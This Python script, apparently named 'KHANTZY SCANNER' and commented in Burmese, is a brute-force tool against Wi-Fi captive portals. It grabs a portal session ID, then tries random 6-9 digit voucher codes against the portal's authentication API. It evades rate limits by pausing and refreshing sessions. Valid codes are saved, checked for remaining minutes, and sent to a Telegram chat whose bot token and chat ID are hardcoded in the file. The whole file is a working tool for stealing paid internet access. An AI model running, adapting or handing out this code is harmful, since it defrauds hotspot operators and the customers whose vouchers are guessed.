import os
import time
import json
import random
import re
import html
import requests
import urllib3
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console, Group
from rich.panel import Panel
from rich.live import Live
from rich.table import Table
from rich.columns import Columns
from rich.align import Align
from rich.text import Text
from rich.prompt import Prompt, Confirm
from rich.box import ROUNDED

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

STATE_FILE = "scanner_state.json"
HITS_FILE = "hits.txt"
PENDING_HITS_FILE = "pending_hits.json"
SENT_HITS_FILE = "sent_hits.json"

BASE_SLEEP_MIN = 0.20
BASE_SLEEP_MAX = 0.35
RATE_LIMIT_SLEEP = 15
NETWORK_RETRY_SLEEP = 1.0
SESSION_REFRESH_SLEEP = 2

# ═══════════════════════════════════════════════════════════════
# ⚠️ ဒီနေရာမှာ သင့် Bot Token နဲ့ Chat ID ကို ဖြည့်ပါ
# ═══════════════════════════════════════════════════════════════
TELEGRAM_BOT_TOKEN = "9158466263:AAH8tRkIaPaGC7fO4KKI87M0vv20kpitQ3A"
TELEGRAM_CHAT_ID = "8547556856"

console = Console()
session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 10)"})


def clear_screen():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        pass


def format_time(seconds):
    try:
        seconds = int(seconds)
        h = seconds // 3600
        m = (seconds % 3600) // 60
        s = seconds % 60
        return f"{h:02d}:{m:02d}:{s:02d}"
    except Exception:
        return "00:00:00"


def normalize_hits(hits):
    if not hits:
        return []
    result = []
    for h in hits:
        if isinstance(h, dict):
            result.append({"code": h.get("code", ""), "time": h.get("time", "--:--:--")})
        elif isinstance(h, str):
            result.append({"code": h, "time": "--:--:--"})
    return result


def hits_codes_only(hits):
    return [h.get("code") if isinstance(h, dict) else h for h in hits]


def load_state():
    try:
        with open(STATE_FILE) as f:
            return json.load(f)
    except Exception:
        return None


def save_state(mode, tested, hits):
    try:
        with open(STATE_FILE, "w") as f:
            json.dump({"mode": mode, "tested": tested, "hits": hits}, f)
    except Exception:
        pass


def clear_state():
    try:
        os.remove(STATE_FILE)
    except Exception:
        pass


def extract_session(value):
    if not value:
        return None
    try:
        value = html.unescape(value)
    except Exception:
        pass
    try:
        q = parse_qs(urlparse(value).query)
        for k, v in q.items():
            if k.lower() == "sessionid" and v:
                return v[0]
    except Exception:
        pass
    try:
        m = re.search(r"sessionId=([a-zA-Z0-9]+)", value, re.IGNORECASE)
        return m.group(1) if m else None
    except Exception:
        return None


def fetch_session():
    probes = [
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://captive.apple.com/hotspot-detect.html",
    ]
    for url in probes:
        try:
            r = session.get(url, timeout=5, allow_redirects=True, verify=False)
        except Exception:
            continue
        try:
            p = urlparse(r.url)
            if "gstatic.com" in p.netloc or "apple.com" in p.netloc:
                continue
            portal_base = f"{p.scheme}://{p.netloc}"

            cands = [r.url, r.text]
            cands.extend(h.headers.get("Location", "") for h in r.history)
            cands.extend(h.url for h in r.history)

            for c in cands:
                sid = extract_session(c)
                if sid:
                    return portal_base, sid

            try:
                m = re.search(r"(?:self|window)\.location\.href\s*=\s*['\"]([^'\"]+)['\"]", r.text)
                if m:
                    nxt = urljoin(r.url, m.group(1))
                    r2 = session.get(nxt, timeout=5, allow_redirects=True, verify=False)
                    sid = extract_session(r2.url) or extract_session(r2.text)
                    if sid:
                        return portal_base, sid
            except Exception:
                pass
        except Exception:
            continue
    return None, None


def test_code(portal_base, session_id, code):
    if not portal_base or not session_id:
        return "__NETWORK_ERROR__"
    url = f"{portal_base}/api/auth/voucher/?lang=en_US"
    headers = {"Content-Type": "application/json", "Origin": portal_base}
    payload = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": "ABCD"}
    try:
        r = session.post(url, json=payload, headers=headers, timeout=6, verify=False)
        return r.text if r.text else "__NETWORK_ERROR__"
    except Exception:
        return "__NETWORK_ERROR__"


def check_code_details(portal_base, session_id, code):
    if not portal_base or not session_id:
        return "ERROR_NO_SESSION"

    host = urlparse(portal_base).netloc
    url = f"https://{host}/api/auth/voucher/?lang=en_US"
    headers = {"Content-Type": "application/json", "Origin": f"https://{host}"}
    payload = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": "ABCD"}

    try:
        # Timeout ကို ၅ စက္ကန့် သတ်မှတ်ထားတယ် (ပိတ်မိနေတာကို ကာကွယ်ဖို့)
        r = session.post(url, json=payload, headers=headers, timeout=5, verify=False)
        res = r.text
        low = res.lower()

        if ('request limited' in low or 'too many' in low or 'blocked' in low 
                or '"limit"' in low or 'sta' in low):
            return "LIMIT"

        if '"success":true' in low or '"authresult":"1"' in low or 'logonurl' in low:
            mins = "Unknown"

            try:
                json_data = json.loads(res)
                result = json_data.get("result", {})
                if isinstance(result, dict):
                    mins = result.get("totalMinutes") or result.get("minutes") or "Unknown"
            except Exception:
                pass

            if mins == "Unknown":
                try:
                    b_url = f"https://{host}/api/auth/balance/getBalance/{session_id}"
                    b_res = session.get(b_url, headers=headers, timeout=5, verify=False).json()
                    b_result = b_res.get("result", {})
                    if isinstance(b_result, dict):
                        mins = b_result.get("totalMinutes") or b_result.get("minutes") or "Unknown"
                except Exception:
                    pass

            return mins
        return "Unknown"
    except Exception:
        return "ERROR"


def format_duration(duration_str):
    try:
        if str(duration_str) in ("LIMIT", "ERROR", "ERROR_NO_SESSION"):
            return str(duration_str)
            
        nums = re.findall(r'\d+', str(duration_str))
        if not nums:
            return "Unknown"
        
        mins = int(nums[0])
        if mins >= 1440:
            days = mins // 1440
            return f"{days}d"
        elif mins >= 60:
            hours = mins // 60
            return f"{hours}h"
        else:
            return f"{mins}m"
    except Exception:
        return "Unknown"


def gen_code(mode, length):
    try:
        if mode == "num":
            return str(random.randint(0, 10**length - 1)).zfill(length)
    except Exception:
        pass
    return ""


# ═══════════════════════════════════════════════════════════════
# TELEGRAM SYNC
# ═══════════════════════════════════════════════════════════════

def get_connection_status():
    try:
        r = session.get("http://connectivitycheck.gstatic.com/generate_204",
                        timeout=3, allow_redirects=False, verify=False)
        if r.status_code == 204:
            return "ONLINE"
        return "PORTAL"
    except Exception:
        return "OFFLINE"


def load_pending_hits():
    try:
        with open(PENDING_HITS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return []


def save_pending_hits(pending):
    try:
        with open(PENDING_HITS_FILE, "w", encoding="utf-8") as f:
            json.dump(pending, f, ensure_ascii=False, indent=2)
    except Exception:
        pass


def add_pending_hit(code, mode_str, status, duration="Unknown"):
    pending = load_pending_hits()
    now = datetime.now()
    pending.append({
        "code": code,
        "mode": mode_str,
        "found_at": now.strftime("%Y-%m-%d %H:%M:%S"),
        "duration": duration,
        "found_status": status,
        "synced": False,
    })
    save_pending_hits(pending)


def send_telegram_message(text):
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        return False
    if not TELEGRAM_CHAT_ID or TELEGRAM_CHAT_ID == "YOUR_CHAT_ID_HERE":
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        r = session.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": text,
            "parse_mode": "HTML",
        }, timeout=10, verify=False)
        return r.ok
    except Exception:
        return False


def sync_pending_hits_to_telegram():
    status = get_connection_status()
    if status != "ONLINE":
        return status, 0

    pending = load_pending_hits()
    
    unsynced = [
        h for h in pending
        if not h.get("synced", False)
        and h.get("duration", "Unknown") not in ("Unknown", "ERROR", "ERROR_NO_SESSION")
    ]

    if not unsynced:
        return status, 0

    lines = ["<b>HIT REPORT</b>", f"Total: <b>{len(unsynced)}</b>", ""]
    
    for h in unsynced:
        code = h.get('code', 'Unknown')
        short_dur = format_duration(h.get('duration', 'Unknown'))
        
        if short_dur == "LIMIT":
            lines.append(f"<code>{code}</code>")
        else:
            lines.append(f"<code>{code}</code> {short_dur}")
            
    msg = "\n".join(lines)
    ok = send_telegram_message(msg)

    if ok:
        for h in pending:
            if not h.get("synced", False) and h in unsynced:
                h["synced"] = True
        save_pending_hits(pending)

        try:
            archive = []
            try:
                with open(SENT_HITS_FILE, "r", encoding="utf-8") as f:
                    archive = json.load(f)
            except Exception:
                archive = []
            archive.extend(unsynced)
            with open(SENT_HITS_FILE, "w", encoding="utf-8") as f:
                json.dump(archive, f, ensure_ascii=False, indent=2)
        except Exception:
            pass

    return status, (len(unsynced) if ok else 0)


# ═══════════════════════════════════════════════════════════════
# UI (Group ကိုသုံးပြီး Box အရှည်ကို ထိန်းချုပ်ထားသည်)
# ═══════════════════════════════════════════════════════════════

def make_layout(mode_name, current_code, tested, elapsed, status, hits, running_logs):
    if status == "Active":
        s_disp = Text("Active", style="bold green", justify="center")
        s_border = "green"
    elif status == "Limit":
        s_disp = Text("Limit", style="bold red", justify="center")
        s_border = "red"
    else:
        s_disp = Text("Idle", style="bold yellow", justify="center")
        s_border = "yellow"

    code_panel = Panel(Align.center(Text(current_code if current_code else "----", style="bold green")), title="Code", border_style="green", box=ROUNDED, expand=True)
    time_panel = Panel(Align.center(Text(elapsed, style="bold cyan")), title="Time", border_style="cyan", box=ROUNDED, expand=True)
    tested_panel = Panel(Align.center(Text(f"{tested:,}", style="bold yellow")), title="Tested", border_style="yellow", box=ROUNDED, expand=True)
    status_panel = Panel(Align.center(s_disp), title="Status", border_style=s_border, box=ROUNDED, expand=True)

    top_grid = Table.grid(expand=True)
    top_grid.add_column(ratio=1)
    top_grid.add_column(ratio=1)
    top_grid.add_column(ratio=1)
    top_grid.add_column(ratio=1)
    top_grid.add_row(code_panel, time_panel, tested_panel, status_panel)

    log_text = Text()
    recent_logs = running_logs[-8:]
    for lg in recent_logs:
        plain_text = Text.from_markup(lg).plain
        log_text.append(f"{plain_text}\n", style="green")
    
    if not recent_logs:
        log_text.append("[dim]Waiting for codes...[/dim]")

    testing_panel = Panel(log_text, title="[bold green]TESTING[/bold green]", border_style="green", box=ROUNDED, expand=True)

    hit_text = Text()
    for i, h in enumerate(hits[-10:], 1):
        c = h.get("code", "") if isinstance(h, dict) else h
        hit_text.append(f"{i}. {c}\n", style="bold green")
        
    if not hits:
        hit_text.append("[dim]No hits yet...[/dim]")

    hit_panel = Panel(hit_text, title="[bold yellow]HIT[/bold yellow]", border_style="yellow", box=ROUNDED, expand=True)

    bottom_columns = Columns([testing_panel, hit_panel], expand=True, align="center")

    footer_text = Text.assemble(
        ("ရပ်တန့်လိုလျှင် ", "dim white"),
        ("Ctrl", "bold red"),
        ("+", "dim white"),
        ("c", "bold yellow"),
        (" ကို ရိုက်ပါ", "dim white")
    )

    render_group = Group(
        top_grid,
        "\n",
        bottom_columns,
        "\n",
        Align.center(footer_text)
    )

    return render_group


def scan_loop(mode, length, start_tested=0, start_hits=None):
    mode_str = f"{mode}_{length}"
    mode_name = f"{mode.upper()} {length}"

    hits = normalize_hits(start_hits) if start_hits else []
    running_logs = []
    tested = start_tested
    start_time = time.time()
    portal_base = None
    session_id = None
    net_error_streak = 0

    live = None
    live_cm = None
    try:
        initial = make_layout(mode_name, "----", tested, "00:00:00", "Idle", hits, running_logs)
        live_cm = Live(initial, refresh_per_second=6, screen=True)
        live = live_cm.__enter__()
    except Exception:
        live = None
        live_cm = None

    def _update(code, status):
        if live is None:
            return
        try:
            live.update(make_layout(mode_name, code, tested,
                                    format_time(time.time() - start_time), status, hits, running_logs))
        except Exception:
            pass

    def push_log(msg):
        t_str = time.strftime("%H:%M:%S")
        running_logs.append(f"[dim]{t_str}[/dim] [green]{msg}[/green]")

    try:
        push_log("Scanner started...")
        while True:
            try:
                try:
                    sync_pending_hits_to_telegram()
                except Exception:
                    pass

                if not session_id or not portal_base:
                    _update("----", "Idle")
                    portal_base, session_id = fetch_session()
                    if not session_id:
                        time.sleep(SESSION_REFRESH_SLEEP)
                        portal_base = "http://portal.local"
                        session_id = "dummy_session"
                    net_error_streak = 0

                code = gen_code(mode, length)
                if not code:
                    time.sleep(BASE_SLEEP_MIN)
                    continue

                tested += 1
                save_state(mode_str, tested, hits)
                push_log(f"{code}")
                _update(code, "Active")

                res = test_code(portal_base, session_id, code)
                low = (res or "").lower()

                if res == "__NETWORK_ERROR__" or res == "":
                    net_error_streak += 1
                    time.sleep(NETWORK_RETRY_SLEEP)
                    if net_error_streak >= 10:
                        session_id = None
                        net_error_streak = 0
                    continue

                net_error_streak = 0

                if ("request limited" in low or "blocked" in low
                        or "too many" in low or '"limit"' in low):
                    _update(code, "Limit")
                    push_log(f"[red]Rate Limit! Sleeping 15s...[/red]")
                    time.sleep(RATE_LIMIT_SLEEP)
                    session_id = None
                    continue

                if ("session timed out" in low or "session timeout" in low
                        or '"session":null' in low):
                    session_id = None
                    continue

                if '"success":true' in low or '"authresult":"1"' in low:
                    existing = hits_codes_only(hits)
                    if code not in existing:
                        now = time.strftime("%H:%M:%S")
                        hits.append({"code": code, "time": now})
                        push_log(f"[bold green]HIT! {code}[/bold green]")
                        try:
                            with open(HITS_FILE, "a", encoding="utf-8") as f:
                                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] CODE: {code}\n")
                        except Exception:
                            pass
                        save_state(mode_str, tested, hits)
                    _update(code, "Active")
                    time.sleep(BASE_SLEEP_MIN)
                    continue

                time.sleep(BASE_SLEEP_MIN + random.uniform(0, BASE_SLEEP_MAX - BASE_SLEEP_MIN))

            except KeyboardInterrupt:
                raise
            except Exception:
                time.sleep(NETWORK_RETRY_SLEEP)
                continue

    finally:
        if live_cm is not None:
            try:
                live_cm.__exit__(None, None, None)
            except Exception:
                pass

        if hits:
            clear_screen()
            console.print(Panel(
                Align.center(Text(f"Scan ရပ်လိုက်ပါပြီ။\nHit ရထားတဲ့ code {len(hits)} ခု ရှိပါတယ်။",
                                  style="bold yellow")),
                border_style="yellow", box=ROUNDED,
            ))
            console.print()

            if Confirm.ask("[bold cyan]➜ ဒီ code တွေရဲ့ time (သက်တမ်း) ကို စစ်မလား? (y/n)[/bold cyan]", default=True):
                console.print("\n[bold cyan][*] Code တွေရဲ့ details စစ်နေသည်...[/bold cyan]\n")
                
                # Portal သို့မဟုတ် Session မရှိရင် အသစ်ပြန်ရှာမယ်
                if not portal_base or not session_id or portal_base == "http://portal.local":
                    console.print("[yellow]Portal/Session အသစ် ပြန်ရှာနေသည်...[/yellow]")
                    portal_base, session_id = fetch_session()
                    if not portal_base or not session_id:
                        console.print("[bold red]Portal/Session ရှာမတွေ့ပါ။ အင်တာနက် ချိတ်ဆက်မှု စစ်ပါ။[/bold red]")
                        Prompt.ask("\n[dim]Enter နှိပ်ပါ[/dim]", default="")
                        return

                for i, h in enumerate(hits, 1):
                    code = h.get("code") if isinstance(h, dict) else h
                    console.print(f"[{i}/{len(hits)}] [yellow]စစ်နေသည်... {code}[/yellow]")

                    duration = check_code_details(portal_base, session_id, code)
                    
                    if duration == "LIMIT":
                        console.print(f"    [bold red]⚠️ Rate Limit မိသွားပါပြီ! ၁၅ စက္ကန့် နားပြီးမှ ဆက်စစ်မည်...[/bold red]")
                        time.sleep(15)
                        duration = check_code_details(portal_base, session_id, code)
                    elif duration in ("ERROR", "ERROR_NO_SESSION"):
                        console.print(f"    [red]✗ Error တက်သွားပါသည်။ ကျော်သွားမည်။[/red]")
                        if duration == "ERROR_NO_SESSION":
                            portal_base, session_id = fetch_session()
                        time.sleep(1)
                        continue

                    add_pending_hit(code, mode_str, "CHECKED", duration)
                    short_dur = format_duration(duration)
                    console.print(f"    Duration: [yellow]{short_dur}[/yellow]")
                    
                    time.sleep(1.5) 

                try:
                    sync_pending_hits_to_telegram()
                except Exception:
                    pass

                Prompt.ask("\n[dim]Enter နှိပ်ပါ[/dim]", default="")
            else:
                for h in hits:
                    code = h.get("code") if isinstance(h, dict) else h
                    add_pending_hit(code, mode_str, "UNCHECKED")
                console.print("[dim]Code တွေကို သိမ်းထားပါမယ် (details မပါ)[/dim]")
                time.sleep(1)


def ask_length():
    while True:
        clear_screen()
        try:
            console.print(Panel(
                Align.center(Text("KHANTZY SCANNER", style="bold magenta")),
                border_style="cyan", box=ROUNDED,
            ))
            console.print()
            menu = Text()
            menu.append("  [6]  6 Digits\n", style="bold cyan")
            menu.append("  [7]  7 Digits\n", style="bold cyan")
            menu.append("  [8]  8 Digits\n", style="bold cyan")
            menu.append("  [9]  9 Digits\n", style="bold cyan")
            menu.append("  [0]  BACK\n", style="bold red")
            console.print(Panel(menu, title="အရှည် ရွေးပါ", border_style="cyan", box=ROUNDED))
            length = Prompt.ask("[bold cyan]➜ အရှည်[/bold cyan]").strip()
        except KeyboardInterrupt:
            raise
        except Exception:
            return None

        if length == "0":
            return None
        if length not in ("6", "7", "8", "9"):
            try:
                console.print("[bold red]မှားရွေးမိပါတယ်။[/bold red]")
                time.sleep(1.5)
            except Exception:
                pass
            continue

        return int(length)


def run():
    try:
        sync_pending_hits_to_telegram()
    except Exception:
        pass

    state = load_state()
    if state:
        try:
            m, l = state["mode"].split("_")
            tested = state.get("tested", 0)
            hits = normalize_hits(state.get("hits", []))

            clear_screen()
            info = Text()
            info.append("  Mode    : ", style="cyan")
            info.append(f"{m.upper()} {l}\n", style="bold white")
            info.append("  Tested  : ", style="cyan")
            info.append(f"{tested:,}\n", style="bold white")
            info.append("  Hits    : ", style="cyan")
            info.append(f"{len(hits)}\n", style="bold green")
            console.print(Panel(info, title="ရှာလက်စ အခြေအနေ",
                                border_style="green", box=ROUNDED))
            console.print()

            if Confirm.ask("[bold yellow]➜ ဆက်ရှာမလား? (y/n)[/bold yellow]",
                           default=True):
                scan_loop(m, int(l), start_tested=tested, start_hits=hits)
                return
            else:
                clear_state()
        except KeyboardInterrupt:
            raise
        except Exception:
            clear_state()

    while True:
        length = ask_length()
        if length is None:
            return

        scan_loop("num", length)
        return


def main():
    try:
        run()
    except KeyboardInterrupt:
        pass
    except BaseException:
        pass
    finally:
        try:
            clear_screen()
        except BaseException:
            pass
        try:
            print("\n\nKhantzy out. Saw shi lar.\n")
            time.sleep(2)
        except BaseException:
            pass


if __name__ == "__main__":
    main()
